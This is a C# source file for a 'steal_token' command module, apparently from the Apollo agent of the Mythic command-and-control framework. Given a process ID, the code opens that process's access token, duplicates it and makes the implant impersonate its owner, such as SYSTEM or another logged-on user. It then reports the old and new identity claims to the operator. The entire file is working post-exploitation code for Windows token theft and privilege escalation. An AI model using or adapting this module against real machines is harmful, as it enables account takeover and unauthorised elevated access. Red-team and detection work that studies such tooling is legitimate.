#define COMMAND_NAME_UPPER

#if DEBUG
#define STEAL_TOKEN
#endif

#if STEAL_TOKEN

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Tasks
{
    public class steal_token : Tasking
    {
        private delegate bool OpenProcessToken(
            IntPtr hProcessHandle,
            TokenAccessLevels dwDesiredAccess,
            out IntPtr hTokenHandle);
        private delegate bool CloseHandle(IntPtr hHandle);

        private OpenProcessToken _pOpenProcessToken;
        private CloseHandle _pCloseHandle;

        public steal_token(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
            _pOpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
            _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
        }

        public override void Start()
        {
            _agent.GetTaskManager().AddTaskResponseToQueue(StealToken());
        }

        private MythicTaskResponse StealToken()
        {
            int pid;
            IntPtr hProcess;
            try
            {
                pid = int.Parse(_data.Parameters);
                hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
            }
            catch (Exception ex)
            {
                return CreateTaskResponse($"Failed to acquire process handle to {_data.Parameters}: {ex.Message}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(
                CreateTaskResponse("", false, "", new IMythicMessage[]
                {
                    Artifact.ProcessOpen(pid)
                }));

            // TOKEN_DUPLICATE | TOKEN_QUERY is all the identity manager needs to make its own copies,
            // which get full access. SeDebugPrivilege does not bypass the token's own DACL, so asking
            // for more here (e.g. TOKEN_ADJUST_*) fails on many SYSTEM and other users' tokens.
            if (!_pOpenProcessToken(hProcess, TokenAccessLevels.Duplicate | TokenAccessLevels.Query, out IntPtr hProcessToken))
            {
                return CreateTaskResponse($"Failed to open process token: {Marshal.GetLastWin32Error()}", true, "error");
            }

            var identityManager = _agent.GetIdentityManager();
            var old = identityManager.GetCurrentImpersonationIdentity();
            var oldIntegrity = identityManager.GetIntegrityLevel();

            bool bRet = identityManager.SetIdentity(hProcessToken);
            int dwError = Marshal.GetLastWin32Error();
            _pCloseHandle(hProcessToken);

            if (!bRet)
            {
                return CreateTaskResponse($"Failed to duplicate token: {dwError}", true, "error");
            }

            var cur = identityManager.GetCurrentImpersonationIdentity();
            var newIntegrity = identityManager.GetIntegrityLevel();
            var integrityMessage = newIntegrity != oldIntegrity ? $" ( {newIntegrity} )" : "";

            return CreateTaskResponse(
                $"Successfully set Impersonation Identity to {cur.Name}\n{FormatClaims("Old", old, oldIntegrity)}\n{FormatClaims("New", cur, newIntegrity)}",
                true,
                "",
                new IMythicMessage[]
                {
                    new CallbackUpdate { ImpersonationContext = $"{cur.Name}{integrityMessage}", IntegrityLevel = (int)newIntegrity }
                });
        }

        private static string FormatClaims(string label, WindowsIdentity identity, IntegrityLevel integrity)
        {
            string authType;
            try
            {
                authType = identity.AuthenticationType;
            }
            catch
            {
                authType = "AccessDenied";
            }

            var output = $"{label} Claims (IntegrityLevel: {integrity}, Authenticated: {identity.IsAuthenticated}, ImpersonationLevel: {identity.ImpersonationLevel}, AuthType: {authType}):\n";
            foreach (var claim in identity.Claims)
            {
                output += claim + "\n";
            }
            return output;
        }
    }
}
#endif
